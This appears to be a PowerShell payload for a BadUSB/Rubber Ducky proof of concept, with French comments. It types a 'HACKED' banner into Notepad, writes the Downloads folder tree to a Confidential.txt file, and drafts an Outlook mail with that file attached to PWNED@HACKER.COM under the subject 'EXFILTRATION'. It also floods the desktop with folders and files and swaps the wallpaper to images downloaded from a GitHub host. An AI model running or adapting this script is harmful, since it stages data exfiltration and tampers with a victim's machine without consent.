function Payload_Launch {

    OpenNotepad
    DownloadsTree
    OutlookNewMail
    FileShow
    CreateWarningSlideshow

}

function OpenNotepad {
    # Open Notepad
    Start-Process notepad
    Start-Sleep -Seconds 2
    
    # Writes the specified text
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('Notepad')
    $wshell.SendKeys("
##     ##    ###     ######  ##    ## ######## ########  
##     ##   ## ##   ##    ## ##   ##  ##       ##     ## 
##     ##  ##   ##  ##       ##  ##   ##       ##     ## 
######### ##     ## ##       #####    ######   ##     ## 
##     ## ######### ##       ##  ##   ##       ##     ## 
##     ## ##     ## ##    ## ##   ##  ##       ##     ## 
##     ## ##     ##  ######  ##    ## ######## ########  
  `r`n")
    Start-Sleep -Seconds 3
    # Fermer le Bloc-notes directement via le processus
    $notepad = Get-Process notepad -ErrorAction SilentlyContinue
    if ($notepad) {
        $notepad.Kill()
    }
}
function CreateWarningSlideshow {
    # Prendre le nom d'utilisateur et le stocker
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    # Chemin du dossier "WARNING" sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $warningFolderPath = Join-Path $desktopPath "WARNING"
    # Créer le dossier "WARNING" s'il n'existe pas
    if (-not (Test-Path $warningFolderPath)) {
        New-Item -Path $warningFolderPath -ItemType Directory | Out-Null
    }
    # Prendre le fond d'écran actuel et le stocker dans le dossier "WARNING"
    $currentWallpaperPath = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name WallPaper).WallPaper
    $currentWallpaperFilename = [System.IO.Path]::GetFileName($currentWallpaperPath)
    $backupWallpaperPath = Join-Path $warningFolderPath $currentWallpaperFilename
    Copy-Item -Path $currentWallpaperPath -Destination $backupWallpaperPath -ErrorAction SilentlyContinue
    # URLs des images pour le diaporama
    $imageURLs = @(
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/1.jpeg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/2.jpg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/3.jpg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/4.jpg"
    )
    # Télécharger les images dans le dossier "WARNING" avec l'extension correcte
    $downloadedImages = @()
    foreach ($url in $imageURLs) {
        $filename = [System.IO.Path]::GetFileNameWithoutExtension($url)
        $extension = [System.IO.Path]::GetExtension($url)
        $destinationPath = Join-Path $warningFolderPath "$filename$extension"
        Invoke-WebRequest -Uri $url -OutFile $destinationPath
        $downloadedImages += $destinationPath
    }
    # Créer le fichier de configuration du diaporama avec un intervalle de 2 secondes pour chaque image
    $slideshowConfig = @"
[Slideshow]
Interval=2
[Path]
${desktopPath}
"@
    $slideshowConfigPath = Join-Path $warningFolderPath "slideshow.ini"
    Set-Content -Path $slideshowConfigPath -Value $slideshowConfig
    # Mettre en place le diaporama comme fond d'écran
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    # Durée totale du diaporama en secondes (2 secondes par image, 4 images)
    $totalDuration = 2 * $downloadedImages.Count  # 2 secs per picture * pictures number
    # Loop for 1 minute (60 secondes)
    $endTime = [DateTime]::Now.AddMinutes(1)
    while ([DateTime]::Now -lt $endTime) {
        foreach ($image in $downloadedImages) {
            [Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x0001 -bor 0x0002)
            Start-Sleep -Seconds 2
        }
    }
    # Putting original Wallpaper as wallpaper again
    [Wallpaper]::SystemParametersInfo(0x0014, 0, $backupWallpaperPath, 0x0001 -bor 0x0002)
}



function DownloadsTree {
    # Exécuter la commande 'cd Téléchargements'
    Set-Location ([Environment]::GetFolderPath('UserProfile') + "\Téléchargements")

    # Exécuter la commande 'tree' et rediriger la sortie vers Confidential.txt sur le bureau
    tree | Out-File ([Environment]::GetFolderPath('Desktop') + "\Confidential.txt")

}

function OutlookNewMail {
    # Créer un nouvel objet Outlook
    $olApp = New-Object -ComObject Outlook.Application
    $mailItem = $olApp.CreateItem(0) # 0: olMailItem
    $mailItem.Display()

    # Définir les propriétés de l'email
    $mailItem.To = "PWNED@HACKER.COM"
    $mailItem.Subject = "EXFILTRATION"
    $mailItem.Body = @"
BOSS,

I hacked the company !!!

They don't know I am here :)


"@

    # Ajouter la pièce jointe "Confidential.zip" située sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $attachmentPath = Join-Path $desktopPath "Confidential.txt"
    if (Test-Path $attachmentPath) {
        $mailItem.Attachments.Add($attachmentPath)
    } else {
        Write-Host "Pièce jointe non trouvée : $attachmentPath"
    }

    # Afficher l'email (optionnel) et envoyer l'email
    $mailItem.Display()  # Affiche l'email (vous pouvez le commenter si vous voulez envoyer directement)
    Start-Sleep -Seconds 8
    $olApp.Quit()
}

function FileShow {
    # Chemin du bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')

    # Créer 10 nouveaux dossiers et 10 nouveaux fichiers textes
    1..10 | ForEach-Object {
        # Nom du dossier et du fichier texte
        $folderName = "Folder_$_"
        $fileName = "File_$_"

        # Chemin complet du dossier et du fichier texte
        $folderPath = Join-Path $desktopPath $folderName
        $filePath = Join-Path $desktopPath "$fileName.txt"

        # Créer le dossier et le fichier texte
        New-Item -Path $folderPath -ItemType Directory | Out-Null
        New-Item -Path $filePath -ItemType File | Out-Null
    }

    # Attendre 5 secondes
    Start-Sleep -Seconds 5

    # Supprimer les dossiers et fichiers textes créés
    1..5 | ForEach-Object {
        $folderName = "Folder_$_"
        $fileName = "File_$_.txt"

        $folderPath = Join-Path $desktopPath $folderName
        $filePath = Join-Path $desktopPath $fileName

        Remove-Item -Path $folderPath -Recurse -Force
        Remove-Item -Path $filePath -Force
    }
}



Payload_Launch